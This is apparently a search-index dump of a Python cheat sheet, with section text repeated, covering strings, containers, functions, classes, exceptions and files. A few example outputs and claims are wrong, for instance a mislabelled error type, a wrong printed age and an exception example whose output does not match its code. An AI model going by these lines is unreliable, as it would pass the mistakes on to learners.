With start and end parameters # Searching - count print ( hello . count ( \"Pyth\" ) ) # 1 -> Found 1 occurance of Pyth print ( hello . count ( \"Pyth\" , 4 , 11 ) ) # 1 ->Found 1 occurance of Pyth # Case operations - upper, lower, title, swapcase, casefold, and capitalize print ( hello . upper () ) # all uppercase -> HELLO PYTHON !! print ( hello . lower () ) # all lowercase -> hello python !! print ( hello . title () ) # first letter capital, all words -> Hello Python !! print ( hello . swapcase () ) # swap all case -> hELLO pYTHON !! print ( hello . casefold () ) # aggressive version of lower, also converts unique unicode characters -> hello python !! print ( hello . capitalize () ) # first uppercase, all lowercase -> # Hello python !! # Alignment - center, ljust, and rjust print ( hello . center ( 50 ) ) # Hello Python !! print ( hello . center ( 50 , '#' ) ) # #################Hello Python !!################## print ( hello . ljust ( 50 ) ) # Hello Python !! print ( hello . rjust ( 50 ) ) # Hello Python !! # partition, encode, zfill # Partition: partition the string, return tuple having before, argument, and after print ( hello . partition ( 'lo ' ) ) # ('Hel', 'lo ', 'Python !!') # Encoding: encodes using given encoding -> print ( hello . encode ( encoding = 'UTF-8' , errors = 'strict' ) ) # b'Hello Python !!' # Zero fill: fills the left spaces with zero print ( hello . zfill ( 50 ) ) # 00000000000000000000000000000000000Hello Python !! # Formatting person = \"Person Name: {} Age: {} Profession: {} \" . format ( \"Joe\" , 25 , \"Accountant\" ) print ( person ) List Operations fruits = [ \"apple\" , \"banana\" , \"orange\" , \"grapes\" ] # append, extend, insert, and remove fruits . append ( \"guava\" ) # Appends the item at the end print ( fruits ) # ['apple', 'banana', 'orange', 'grapes', 'guava'] fruits . append ( \"guava\" ) # Appends the item at the end print ( fruits ) # ['apple', 'banana', 'orange', 'grapes', 'guava', 'guava'] fruits . extend ( [ \"litchi\" , \"watermelon\" ] ) # Adds multiple items to the set print ( fruits ) # ['apple', 'banana', 'orange', 'grapes', 'guava', 'guava', 'litchi', 'watermelon'] fruits . insert ( 3 , \"guava\" ) # Adds the item at the given index print ( fruits ) # ['apple', 'banana', 'orange', 'guava', 'grapes', 'guava', 'guava', 'litchi', 'watermelon'] fruits . remove ( \"guava\" ) # Removes first matching item print ( fruits ) # ['apple', 'banana', 'orange', 'grapes', 'guava', 'guava', 'litchi', 'watermelon'] # pop, copy, and clear poppedItem = fruits . pop ( 4 ) # Removes the item at the given index print ( poppedItem ) # guava print ( fruits ) # ['apple', 'banana', 'orange', 'grapes', 'guava', 'litchi', 'watermelon'] fruitsCopy = fruits . copy () # Shallow copy print ( fruitsCopy ) # ['apple', 'banana', 'orange', 'grapes', 'guava', 'litchi', 'watermelon'] fruitsCopy . clear () print ( fruitsCopy ) # [] # sort and reverse fruits . sort () print ( fruits ) # ['apple', 'banana', 'grapes', 'guava', 'litchi', 'orange', 'watermelon'] fruits . reverse () print ( fruits ) # ['watermelon', 'orange', 'litchi', 'guava', 'grapes', 'banana', 'apple'] # read, update, delete print ( fruits [ 1 ] ) # orange fruits [ 1 ] = \"kiwi\" print ( fruits ) # ['watermelon', 'kiwi', 'litchi', 'guava', 'grapes', 'banana', 'apple'] del fruits [ 1 ] print ( fruits ) # ['watermelon', 'litchi', 'guava', 'grapes', 'banana', 'apple'] Dictionary Operations person = { \"name\" : \"Joe\" , \"age\" : 24 , \"dob\" : \"25-11-2000\" , \"profession\" : \"Software Developer\" } # keys, values, and items # returns iterable for iterations print ( person . keys () ) # dict_keys(['name', 'age', 'dob', 'profession']) print ( person . values () ) # dict_values(['Joe', 24, '25-11-2000', 'Software Developer']) print ( person . items () ) # dict_items([('name', 'Joe'), ('age', 24), ('dob', '25-11-2000'), ('profession', 'Software Developer')]) # pop, popitem, copy, and clear poppedItem = person . pop ( \"dob\" ) # Removes the item having given key print ( poppedItem ) # 25-11-2000 print ( person ) # {'name': 'Joe', 'age': 24, 'profession': 'Software Developer'} poppedItem = person . popitem () # Removes the item inserted last print ( poppedItem ) # ('profession', 'Software Developer') print ( person ) # {'name': 'Joe', 'age': 24} personCopy = person . copy () # Shallow copy print ( personCopy ) # {'name': 'Joe', 'age': 24} # add, read, get, and update person [ \"profession\" ] = \"Teacher\" print ( person ) # {'name': 'Joe', 'age': 24, 'profession': 'Teacher'} person [ \"profession\" ] = \"Musician\" print ( person ) # {'name': 'Joe', 'age': 24, 'profession': 'Musician'} print ( person [ \"age\" ] ) # 24 print ( person . get ( \"age\" ) ) # 24 person . update ( { \"age\" : 28 } ) print ( person . get ( \"age\" ) ) # 28 # delete del person [ \"age\" ] print ( person ) # {'name': 'Joe', 'profession': 'Musician'} Set Operations fruits = { \"apple\" , \"banana\" , \"orange\" , \"grapes\" } # add, update, remove, and discard fruits . add ( \"guava\" ) # Adds the item to the set if not exist print ( fruits ) # {'apple', 'banana', 'orange', 'guava', 'grapes'} fruits . add ( \"guava\" ) # Adds the item to the set if not exist print ( fruits ) # {'apple', 'banana', 'orange', 'guava', 'grapes'} fruits . update ( [ \"litchi\" , \"watermelon\" ] ) # Adds multiple items to the set print ( fruits ) # {'apple', 'banana', 'litchi', 'orange', 'watermelon', 'guava', 'grapes'} fruits . remove ( \"litchi\" ) # Find and remove the item, throws error if not found print ( fruits ) # {'apple', 'banana', 'orange', 'watermelon', 'guava', 'grapes'} fruits . discard ( \"litchi\" ) # Find and remove the item, does not throw any error print ( fruits ) # {'apple', 'banana', 'orange', 'watermelon', 'guava', 'grapes'} # pop, copy, and clear poppedItem = fruits . pop () # Removes an arbitrary item print ( poppedItem ) # apple print ( fruits ) # {'banana', 'orange', 'watermelon', 'guava', 'grapes'} fruitsCopy = fruits . copy () # Shallow copy print ( fruitsCopy ) # {'banana', 'guava', 'grapes', 'orange', 'watermelon'} fruitsCopy . clear () print ( fruitsCopy ) # set() Lambda # Lambda: Anonymous function # Arguments: Accepts n arguments # Expressions: Only one expression is allowed # Syntax: lambda arguments : expression addTo100 = lambda a : a + 100 print ( addTo100 ( 50 ) ) # 150 multiplyBy2 = lambda a : a * 2 print ( multiplyBy2 ( 25 ) ) # 50 Classes & Objects # Python is an object oriented programming language # Almost everything in Python is an object # Almost everything has attributes and methods # All functions have a built-in attribute __doc__ # Some objects have neither attributes nor methods # Some objects are final class Person : def __init__ ( self , name , age , profession ) : self . name = name self . age = age self . profession = profession def printInfo ( self ) : print ( \"Person Name: {} Age: {} Profession: {} \" . format ( self . name , self . age , self . profession ) ) joe = Person ( \"Joe\" , 35 , \"Software Engineer\" ) joe . printInfo () # Person Name: Joe Age: 35 Profession: Software Engineer Modules & Packages # Module: A file having Python code including statements and definitions is called as Module. # A module can define variables, functions, and classes. # A module can also include code which can be executed. # The file name must be module name appended by .py extension. # Module name can be accessed within it using the global __name__. # Package: A Python package is a collection of Python modules. # Package is a directory having modules. # Regular packages must have an additional __init__.py file, to distinguish it from a directory. # Namespace packages since Python 3.3 do not need __init__.py file ## Module - models.py class Person : def __init__ ( self , name , age , profession ): self . name = name self . age = age self . profession = profession def printInfo ( self ) : print ( \"Person Name: {} Age: {} Profession: {} \" . format ( self . name , self . age , self . profession ) ) ## Module - main.py # Search for models.py in current directory, main.py directory # Search for models.py in the list of directories in the PYTHONPATH environment variable import models # Use import mylib.models if models module is available in mylib directory joe = models . Person ( \"Joe\" , 35 , \"Software Engineer\" ) joe . printInfo () # Person Name: Joe Age: 35 Profession: Software Engineer ## Module - main.py from models import Person joe = Person ( \"Joe\" , 35 , \"Software Engineer\" ) joe . printInfo () # Person Name: Joe Age: 35 Profession: Software Engineer ## Execute main module on console python main . py ## List directories where Python searches for the Module import sys print ( sys . path ) ## Sample Directory Structure \u251c\u2500\u2500 nspkg1 \u2502 \u2514\u2500\u2500 regpkg1 \u2502 \u251c\u2500\u2500 __init__ . py \u2502 \u2514\u2500\u2500 vehicle . py \u251c\u2500\u2500 nspkg2 \u2502 \u2514\u2500\u2500 nspkg2sub1 \u2502 \u2514\u2500\u2500 person . py \u251c\u2500\u2500 main . py ## Imports in main.py import nspkg1.regpkg1.vehicle import nspkg2.nspkg2sub1.person Errors & Exceptions # Errors # Program stops working on error # Python raises exceptions when it encounter error # Syntax or parsing errors are the most common for beginners # Exceptions # No syntax errors found, program starts execution # Errors detected during execution are called exceptions # Use try: except: finally: to catch and handle the exceptions # Use try: except: finally: to avoid program termination on exceptions # Use try: except: else: instead of try: except: finally: for alternate flows # Multiple except can be use to catch the exceptions ## Program a = 10 * ( 1 / 0 ) ## Throws division by zero exception and terminate the program Traceback ( most recent call last ): File \"\" , line 1 , in a = 10 * ( 1 / 0 ) ZeroDivisionError : division by zero ## Updated Program - Valid - Try: Except: Finally b = 10 try : a = 10 * ( 1 / b ) print ( \"a = {} \" . format ( a ) ) except : print ( \"Caught divide by zero - while getting a\" ) print ( \"Execute on error - b must be non-zero value\" ) finally : print ( \"Execute Always - normal and exceptional flow\" ) ## Output a = 1.0 Execute Always - normal and exceptional flow ## Updated Program - Error - Try: Except: Finally b = 0 try : a = 10 * ( 1 / b ) print ( \"a = {} \" . format ( a ) ) except : print ( \"Caught divide by zero - while getting a\" ) print ( \"Execute on error - b must be non-zero value\" ) else : print ( \"Alternate to exceptional flow\" ) ## Output Caught divide by zero - while getting a Execute on error - b must be non - zero value Execute Always - normal and exceptional flow Math # math.ceil( num ) - Smallest integer greater than or equal to num # math.floor( num ) - Largest integer less than or equal to num # math.fabs( num ) - Absolute of num # math.factorial( num ) - Integer value of num factorial # math.pow( num, power ) - num raised to the power # math.sqrt( num ) - Square root of num # math.isqrt( num ) - Integer square root of the nonnegative integer num # math.asin( num ) - Arc sine of num radians # math.acos( num ) - Arc cosine of num radians # math.atan( num ) - Arc tangent of num radians # math.sin( num ) - Sine of num radians # math.cos( num ) - Cosine of num radians # math.tan( num ) - Tangent of num radians # math.dist( num1, num2 ) - Euclidean distance between two points num1 and num2 # math.degrees( num ) - Angle num from radians to degrees # math.radians( num ) - Degree num from degrees to radians # math.exp(x) - e raised to the power x, e = 2.718281 # math.expm1(x) - e raised to the power x minus 1, e = 2.718281 # math.log( num[, base] ) - One argument -> natural logarithm of x (to base e), Two arguments -> logarithm of x to the given base # math.log2( num ) - base-2 logarithm of num ## Examples import math num = 12.25 print ( math . ceil ( num ) ) # 13 print ( math . floor ( num ) ) # 12 Files # Function: open # Arguments: 1st -> File path with name, 2nd -> Mode, 3rd -> Encoding # Modes: r -> read only, w -> write only, a -> append only, r+ -> read/write # Optionally append t or b to the mode to specify among text or binary ## Example - Open f = open ( \"test.txt\" ) # same as open( \"test.txt\", \"rt\" ) ## Example - Write # Open the file test.txt in write mode file = open ( \"test.txt\" , \"w\" , encoding = \"utf8\" ) file . write ( \"Hello Python !! \\n \" ) file . writelines ( [ \"Line 1 \\n \" , \"Line 2 \\n \" , \"Line 3 \\n \" ] ) file . close () ## Example - Read all lines try : file = open ( \"test.txt\" , \"r\" ) text = file . read ( 15 ) # Read first 15 characters print ( text ) file . seek ( 0 ) for line in file : print ( line . rstrip () ) except : print ( \"Failed to open the file\" ) finally : file . close () ## Output Hello Python !! Hello Python !! Line 1 Line 2 Line 3 Original Source","title":"Python"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#python","text":"","title":"Python"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#table-of-contents","text":"Installers Data Types Containers Keywords & Identifiers Arithmetic Operators Assignment Operators Relational Operators Logical Operators Identity & Membership Operators Bitwise Operators Type Conversions Print & Input Formatting Sequences (Ordered Sets) Binary Sequences Mapping & Sets Conditional Statements Iterative Loop Statement Conditional Loop Statement Functions Generic Operations on Containers String Operations List Operations Dictionary Operations Set Operations Lambda Classes & Objects Modules & Packages Errors & Exceptions Math Files","title":"Table of Contents"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#installers","text":"Python 3.8 on Windows Python 3.8 On Ubuntu PyCharm on Windows PyCharm on Ubuntu Visual Studio Code on Windows Visual Studio Code on Ubuntu Eclipse on Windows Eclipse on Ubuntu","title":"Installers"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#data-types","text":"# Base Data Types Numeric : int , float , complex Boolean : bool # Container Data Types Text : str Sequence : list , tuple , range Mapping : dict Set : set , frozenset Binary Sequence : bytes , bytearray , memoryview # Data Examples int : 12321 , float : 12.342 , complex : 2 + 12 j bool : True str : \"Hello Python\" list : [ \"apple\" , \"banana\" , \"orange\" ], tuple : ( \"apple\" , \"banana\" , \"orange\" ), range : range ( 20 ) dict : { \"name\" : \"Rock\" , \"age\" : 18 } set : { \"apple\" , \"banana\" , \"orange\" }, frozenset : frozenset ({ \"apple\" , \"banana\" , \"orange\" }) bytes : b \"ABC\" , bytearray : bytearray ( 8 ), memoryview : memoryview ( bytes ( 8 )) # Data Range int : unbounded float : 2.2250738585072014e-308 to 1.7976931348623157e+308","title":"Data Types"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#containers-contains","text":"# Containers having method __contains__ str : \"Hello Python\" list : [ \"apple\" , \"banana\" , \"orange\" ], tuple : ( \"apple\" , \"banana\" , \"orange\" ), range : range ( 20 ) dict : { \"name\" : \"Rock\" , \"age\" : 18 } set : { \"apple\" , \"banana\" , \"orange\" }, frozenset : frozenset ({ \"apple\" , \"banana\" , \"orange\" }) bytes : b \"ABC\" bytearray : bytearray ( 8 ) # Immutable: str, tuple, frozenset, bytes # Access the contained objects # Iterate over contained objects # Supports in operator tempStr = \"Hello Python\" print ( \"llo\" in tempStr ) # Output: True # Test containers from collections.abc import Container tempStr = \"Hello Python\" print ( isinstance ( tempStr , Container ) ) # Output: True","title":"Containers (contains)"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#keywords-identifiers","text":"# Keywords are reserved words in Python # Keywords are case sensitive # Keywords: if, else, elif, for, while, in, as, is, and, or, not, with, from, break, pass, continue, return # Keywords: class, finally, try, assert, def, nonlocal, del, yield # Keywords: import, global, lambda, async, except, await, raise, None, True, False # Identifier can be used as name of variables, classes, or functions # Identifier Rules # Can have a to z, A to Z, 0 to 9, or _ underscore # Cannot start with a digit # Cannot use special characters including !, @, #, $, % # Keywords cannot be used as Identifier # Can be of any length # Identifiers are case sensitive # Identifier Examples # Correct: alpha, _bravo, alpha12, alpha_bravo, alpha_123, this_is_a_long_name # Correct: alpha, Alpha, aLpha, and alphA : all are different # Wrong: 12alpha, @alpha, al!pha, else, while","title":"Keywords &amp; Identifiers"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#arithmetic-operators","text":"+ : Addition : a + b , a + b + c - : Subtraction : a - b , a + b - c * : Multiplication : a * b , a * ( b + c ) / : Division : a / b , ( a + b ) / c % : Modulus : a % b ** : Exponentiation : a ** b // : Floor division : a // b","title":"Arithmetic Operators"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#assignment-operators","text":"= : Simple : a = b += : Increment : a += b ~ a = a + b -= : Decrement : a -= b ~ a = a - b *= : Multiplication : a *= b ~ a = a * b /= : Division : a /= b ~ a = a / b %= : Modulus : a %= b ~ a = a % b **= : Exponentiation : a **= b ~ a = a ** b //= : Floor division : a //= b ~ a = a // b","title":"Assignment Operators"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#relational-operators","text":"== : Equal : a == b != : Not equal : a != b > : Greater than : a > b < : Less than : a < b >= : Greater than or equal to : a >= b <= : Less than or equal to : a <= b","title":"Relational Operators"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#logical-operators","text":"and : x == 25 and y == 35 or : x == 25 or y == 35 not : not ( x == 25 and y == 35 )","title":"Logical Operators"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#identity-membership-operators","text":"# Identity Operators - Tests for same objects is : x is y is not : x is not y # Membership Operators - Tests for sequence in an object in : x in y not in : x not in y","title":"Identity &amp; Membership Operators"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#bitwise-operators","text":"& : AND : Copies 1 if both bits are 1 , else use 0 | : OR : Copies 1 if either of the bits is 1 , else use 0 ^ : XOR : Copies 1 if only one of the bits is 1 , else use 0 ~ : NOT : Simply flip the bits << : left shift : Shift left and fill by zero on right >> : right shift : Shift right and fill by zero on left","title":"Bitwise Operators"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#type-conversions","text":"# Integers a = int ( 121 ) # 121 b = int ( 21.21 ) # 21 c = int ( \"151\" ) # 151 d = int ( \"15f\" , 16 ) # 351 # Floats a = float ( \"5.25e5\" ) # 525000.0 # Booleans a = '' b = 'abc' c = 12 d = bool ( a ) # False e = bool ( b ) # True f = bool ( c ) # True # Strings a = str ( \"hello\" ) # hello b = str ( 51 ) # 51 c = str ( 25.25 ) # 25.25","title":"Type Conversions"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#print-input","text":"# Input # Read input as string from console # Convert the input string accordingly fruits = [ \"apple\" , \"banana\" , \"orange\" , \"grapes\" ] choice = input ( \"Enter from 1 to 4:\" ) choice = int ( choice ) if choice < 1 or choice > 4 : print ( \"Wrong choice\" ) else : print ( fruits [ choice - 1 ] ) # Print # print literal values print ( \"Hello Python !!\" ) print ( 15 ) print ( 25.25 ) # print variables name = \"Ricky\" print ( name ) # print expressions start = 20 end = 50 print ( end - start )","title":"Print &amp; Input"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#formatting","text":"## Conversion Types d , i - Signed integer decimal , i is not supported by format method o - Unsigned octal , u - Unsigned decimal x , X - Unsigned hexadecimal , leading 0 x or 0 X e , E - Floating point exponential format f , F - Floating point decimal format c - Single character r - String ( converts python object using repr ()) s - String ( converts python object using str ()) # String and Number print ( \" %(name)s , %(age)d \" % { 'name' : \"Joe\" , \"age\" : 25 } ) # Joe, 25 print ( ' {0:s} , {1:d} ' . format ( \"Joe\" , 25 ) ) # Joe, 25 # Fixed digit numbers print ( \" %(name)s , %(age)03d \" % { 'name' : \"Joe\" , \"age\" : 25 } ) # Joe, 025 print ( ' {0:s} , {1:03d} ' . format ( \"Joe\" , 25 ) ) # Joe, 025 # Floating point print ( \" %(name)s , %(weight)3.2f \" % { 'name' : \"Joe\" , \"weight\" : 25.2456 } ) # Joe, 25.25 print ( ' {0:s} , {1:3.2f} ' . format ( \"Joe\" , 25.2456 ) ) # Joe, 25.25","title":"Formatting"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#sequences-ordered-sets","text":"# string # ordered, indexed, unchangeable (immutable), allows duplicates hello = \"Hello Python !!\" print ( hello [ 0 ] ) # H print ( hello [ 4 ] ) # 0 print ( hello [ 1 , 4 ] ) # syntax error, range not allowed hello [ 0 ] = \"K\" # syntax error, immutable, item assignment not allowed # list # ordered, indexed, changeable (mutable), allows duplicates fruits = [ \"apple\" , \"banana\" , \"orange\" , \"grapes\" ] print ( fruits [ 0 ] ) # apple print ( fruits [ 2 ] ) # orange print ( fruits [ 1 : 3 ] ) # ['banana', 'orange'] print ( fruits [: 2 ] ) # ['apple', 'banana'] print ( fruits [ - 3 : - 1 ] ) # ['banana', 'orange'] print ( fruits [ - 3 :] ) # ['banana', 'orange', 'grapes'] fruits [ 0 ] = \"banana\" print ( fruits [ 0 ] ) # banana print ( fruits [ 1 ] ) # banana # tuple # ordered, indexed, unchangeable (immutable), allows duplicates vehicles = ( \"car\" , \"bus\" , \"truck\" ) print ( vehicles [ 0 ] ) # car print ( vehicles [ 1 ] ) # bus vehicles [ 0 ] = \"bicycle\" # syntax error, immutable, item assignment not allowed # range # generates an immutable sequence of numbers over time a = range ( 5 ) b = range ( 0 , 5 ) c = range ( 0 , 10 , 2 ) print ( a [ 2 ] ) # 2 print ( c [ 2 ] ) # 4","title":"Sequences (Ordered Sets)"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#binary-sequences","text":"# bytes # ordered, indexed, unchangeable (immutable), allows duplicates hello1 = b \"Hello Python !!\" hello2 = bytes ( 'Hello Python !!' , 'utf8' ) print ( hello1 [ 0 ] ) # 72 print ( hello2 [ 4 ] ) # 111 print ( hello1 ) # b'Hello Python !!' print ( hello1 . decode () ) # Hello Python !! print ( hello [ 1 , 4 ] ) # syntax error, range not allowed hello [ 0 ] = \"K\" # syntax error, immutable, item assignment not allowed # bytearray hello1 = bytearray ( b \"Hello Python !!\" ) hello2 = bytearray ( \"Hello Python !!\" , \"utf8\" ) hello3 = bytearray ( [ 72 , 101 , 108 , 108 , 111 ] ) print ( hello1 ) # bytearray(b'Hello Python !!') print ( hello2 ) # bytearray(b'Hello Python !!') print ( hello3 ) # bytearray(b'Hello') print ( hello3 . decode () ) # Hello","title":"Binary Sequences"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#mapping-sets","text":"# dict # unordered, indexed, changeable (mutable), allows duplicates person = { \"name\" : \"Joe\" , \"age\" : 24 } print ( person [ \"name\" ] ) # Joe print ( person [ \"age\" ] ) # 24 print ( person . get ( \"name\" ) ) # Joe print ( person ) # {'name': 'Joe', 'age': 24} person [ \"name\" ] = \"Jack\" print ( person [ \"name\" ] ) # Jack # convert list of list or tuple to dict person1 = dict ( [ [ \"name\" , \"Joe\" ], [ \"age\" , 24 ] ] ) person2 = dict ( [ ( \"name\" , \"Joe\" ), ( \"age\" , 24 ) ] ) print ( person1 ) # {'name': 'Joe', 'age': 24} print ( person2 ) # {'name': 'Joe', 'age': 24} # set # unordered, unindexed, changeable (mutable), no duplicates fruits = { \"apple\" , \"banana\" , \"orange\" , \"grapes\" } print ( fruits ) # {'apple', 'grapes', 'orange', 'banana'} print ( fruits ) # {'apple', 'grapes', 'banana', 'orange'} a = fruits [ 0 ] # syntax error, unsubscriptable # convert list or tuple to set fruits1 = set ( [ \"apple\" , \"banana\" , \"orange\" , \"grapes\" ] ) fruits2 = set ( ( \"apple\" , \"banana\" , \"orange\" , \"grapes\" ) ) print ( fruits1 ) # {'apple', 'orange', 'grapes', 'banana'} print ( fruits2 ) # {'apple', 'orange', 'grapes', 'banana'} # frozenset # unordered, unindexed, unchangeable (immutable), no duplicates","title":"Mapping &amp; Sets"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#conditional-statements","text":"# Statement Blocks - if, else and elif # Statement blocks works using indentations # Statement block executed only if given condition is true # if fruits = [ \"apple\" , \"banana\" , \"orange\" , \"grapes\" ] if \"banana\" in fruits : print ( \"Found Banana\" ) # else if \"banana\" in fruits : print ( \"Found Banana\" ) else : print ( \"Banana is missing\" ) # elif name = \"Joe\" if name == \"Rock\" : print ( \"Rock is performing now\" ) elif name == \"Joe\" : print ( \"Joe is performing now\" ) else : print ( \"Stage is free\" )","title":"Conditional Statements"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#iterative-loop-statement","text":"# Iterative Loop - for # Statement blocks works using indentations # Statement block executed for each item of container # Iterate list fruits = [ \"apple\" , \"banana\" , \"orange\" , \"grapes\" ] # Standard for fruit in fruits : print ( fruit ) # Iterate with index using range for i in range ( len ( fruits )): print ( \"Fruit {} : {} \" . format ( i + 1 , fruits [ i ] ) ) # Iterate with index using enumerate for num , name in enumerate ( fruits , start = 1 ): print ( \"Fruit {} : {} \" . format ( num , name ) ) # Iterate set fruits = { \"apple\" , \"banana\" , \"orange\" , \"grapes\" } for fruit in fruits : print ( fruit ) # Iterate dict person = { \"name\" : \"Joe\" , \"age\" : 24 } for key in person : print ( \"Person {} : {} \" . format ( key , person [ key ] ) )","title":"Iterative Loop Statement"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#conditional-loop-statement","text":"# Conditional Loop - while # Statement blocks works using indentations # Statement block executed for each item of container till the condition is true # while with condition limit = 5 start = 1 factor = 2 while start <= limit : result = start * factor print ( \"Multiplied {} by {} : {} \" . format ( start , factor , result ) ) start = start + 1 # while with condition and break fruits = [ \"apple\" , \"banana\" , \"orange\" , \"grapes\" ] count = len ( fruits ) index = 0 while index < count : if fruits [ index ] == \"orange\" : print ( \"Found orange\" ) break else : index = index + 1 continue","title":"Conditional Loop Statement"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#functions","text":"# Declaration & Definition # def functionName(argument1, argument2, argument3) # Declared using the def keyword # Function name must be a valid identifier # Function can have 0 to n arguments # Function arguments can be literal values, variables (valid identifiers), and expressions # Function is a block of code which runs when it is called # Function block can have multiple statements # Function variables exists within the function blocks during the call def sum ( a , b ) : return a + b def subtract ( a , b ) : return a - b def getPerson ( name , age ) : person = { \"name\" : name , \"age\" : age } return person # Call # Functions can be called by passing the arguments according to the declaration a = 20 b = 50 c = sum ( a , b ) d = sum ( b , 50 ) e = subtract ( b , a ) p = getPerson ( \"Joe\" , 25 ) print ( \"Sum - {} plus {} : {} \" . format ( a , b , c ) ) # Sum - 20 plus 50: 70 print ( \"Sum - {} plus 50: {} \" . format ( b , d ) ) # Sum - 50 plus 50: 100 print ( \"Subtraction - {} minus {} : {} \" . format ( b , a , e ) ) # Subtraction - 50 minus 20: 30 print ( \"Person - {} \" . format ( p ) ) # Person - {'name': 'Joe', 'age': 75}","title":"Functions"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#generic-operations-on-containers","text":"# Containers: str, list, tuple, range, dict, set, frozenset, bytes, bytearray # Uses keys for dictionaries # Generic # Items count: len(container) -> Returns items count # Min value: min(container) -> Returns item having minimum value # Max value: max(container) -> Returns item having maximum value # Sorting: sorted(container) -> Returns items in sorted order # Searching: in operator -> item in container, item not in container # Iterate: enumerate(container) -> returns iterator to iterate the container # All true: all(container) -> Returns True if all items evaluates to true # Any one true: any(container) -> Returns True if any one of the items evaluates to true # Numeric # Items sum: sum(container) -> Returns sum of all items value, works for containers having numeric items # Ordered Sequences # Reversed: reversed(container) -> Returns the items in reversed order # Item index: container.index(val) -> Finds the index of given item value","title":"Generic Operations on Containers"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#string-operations","text":"hello = \"Hello Python !!\" fruits = [ \"apple\" , \"banana\" , \"orange\" , \"grapes\" ] # Split, Join, and Strip - split, join, and strip print ( hello . split ( ' ' ) ) # Split using space as delimiter -> ['Hello', 'Python', '!!'] print ( ',' . join ( fruits ) ) # Join using comma as delimiter -> apple,banana,orange,grapes print ( hello . strip () ) # Strips whitespace on left and right -> 'Hello Python !!' # Searching - startsWith and endsWith # Tests whether sub-string is found print ( hello . startswith ( \"He\" ) ) # True -> Without start and end parameters print ( hello . startswith ( \"llo\" , 2 , 8 ) ) # True -> With start and end parameters print ( hello . startswith ( \"Pyt\" , 6 ) ) # True -> With start parameter # Searching - find and index # Returns starting index if found, find returns -1, index throws exception print ( hello . find ( \"llo\" ) ) # 2 -> Without start and end parameters print ( hello . find ( \"Pyth\" , 4 , 11 ) ) # 6 -> With start and end parameters print ( hello . index ( \"llo\" ) ) # 2 -> Without start and end parameters print ( hello . index ( \"Pyth\" , 4 , 11 ) ) # 6 -> With start and end parameters # Searching - count print ( hello . count ( \"Pyth\" ) ) # 1 -> Found 1 occurance of Pyth print ( hello . count ( \"Pyth\" , 4 , 11 ) ) # 1 ->Found 1 occurance of Pyth # Case operations - upper, lower, title, swapcase, casefold, and capitalize print ( hello . upper () ) # all uppercase -> HELLO PYTHON !! print ( hello . lower () ) # all lowercase -> hello python !! print ( hello . title () ) # first letter capital, all words -> Hello Python !! print ( hello . swapcase () ) # swap all case -> hELLO pYTHON !! print ( hello . casefold () ) # aggressive version of lower, also converts unique unicode characters -> hello python !! print ( hello . capitalize () ) # first uppercase, all lowercase -> # Hello python !! # Alignment - center, ljust, and rjust print ( hello . center ( 50 ) ) # Hello Python !! print ( hello . center ( 50 , '#' ) ) # #################Hello Python !!################## print ( hello . ljust ( 50 ) ) # Hello Python !! print ( hello . rjust ( 50 ) ) # Hello Python !! # partition, encode, zfill # Partition: partition the string, return tuple having before, argument, and after print ( hello . partition ( 'lo ' ) ) # ('Hel', 'lo ', 'Python !!') # Encoding: encodes using given encoding -> print ( hello . encode ( encoding = 'UTF-8' , errors = 'strict' ) ) # b'Hello Python !!' # Zero fill: fills the left spaces with zero print ( hello . zfill ( 50 ) ) # 00000000000000000000000000000000000Hello Python !! # Formatting person = \"Person Name: {} Age: {} Profession: {} \" . format ( \"Joe\" , 25 , \"Accountant\" ) print ( person )","title":"String Operations"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#list-operations","text":"fruits = [ \"apple\" , \"banana\" , \"orange\" , \"grapes\" ] # append, extend, insert, and remove fruits . append ( \"guava\" ) # Appends the item at the end print ( fruits ) # ['apple', 'banana', 'orange', 'grapes', 'guava'] fruits . append ( \"guava\" ) # Appends the item at the end print ( fruits ) # ['apple', 'banana', 'orange', 'grapes', 'guava', 'guava'] fruits . extend ( [ \"litchi\" , \"watermelon\" ] ) # Adds multiple items to the set print ( fruits ) # ['apple', 'banana', 'orange', 'grapes', 'guava', 'guava', 'litchi', 'watermelon'] fruits . insert ( 3 , \"guava\" ) # Adds the item at the given index print ( fruits ) # ['apple', 'banana', 'orange', 'guava', 'grapes', 'guava', 'guava', 'litchi', 'watermelon'] fruits . remove ( \"guava\" ) # Removes first matching item print ( fruits ) # ['apple', 'banana', 'orange', 'grapes', 'guava', 'guava', 'litchi', 'watermelon'] # pop, copy, and clear poppedItem = fruits . pop ( 4 ) # Removes the item at the given index print ( poppedItem ) # guava print ( fruits ) # ['apple', 'banana', 'orange', 'grapes', 'guava', 'litchi', 'watermelon'] fruitsCopy = fruits . copy () # Shallow copy print ( fruitsCopy ) # ['apple', 'banana', 'orange', 'grapes', 'guava', 'litchi', 'watermelon'] fruitsCopy . clear () print ( fruitsCopy ) # [] # sort and reverse fruits . sort () print ( fruits ) # ['apple', 'banana', 'grapes', 'guava', 'litchi', 'orange', 'watermelon'] fruits . reverse () print ( fruits ) # ['watermelon', 'orange', 'litchi', 'guava', 'grapes', 'banana', 'apple'] # read, update, delete print ( fruits [ 1 ] ) # orange fruits [ 1 ] = \"kiwi\" print ( fruits ) # ['watermelon', 'kiwi', 'litchi', 'guava', 'grapes', 'banana', 'apple'] del fruits [ 1 ] print ( fruits ) # ['watermelon', 'litchi', 'guava', 'grapes', 'banana', 